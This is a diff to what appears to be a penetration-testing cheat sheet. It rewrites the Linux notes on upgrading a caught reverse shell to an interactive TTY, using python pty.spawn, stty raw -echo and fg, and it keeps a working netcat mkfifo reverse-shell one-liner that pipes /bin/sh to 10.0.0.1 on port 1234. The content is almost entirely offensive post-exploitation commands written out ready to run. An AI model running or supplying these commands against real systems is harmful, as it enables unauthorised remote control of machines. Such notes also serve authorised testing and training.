@@ -180,13 +180,19 @@ certutil -encode PATH DESTINATION
 ## Linux
 
 ```
-#fix shell
-echo $TERM
-stty -a
-^Z + stty raw -echo + fg + reset
-export SHELL=bash
-export TERM=xterm256-color
-stty rows 24 columns 80
+# In reverse shell
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl-Z
+
+# In Kali
+$ stty raw -echo
+$ fg
+
+# In reverse shell
+$ reset
+$ export SHELL=bash
+$ export TERM=xterm-256color
+$ stty rows <num> columns <cols>
 
 
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
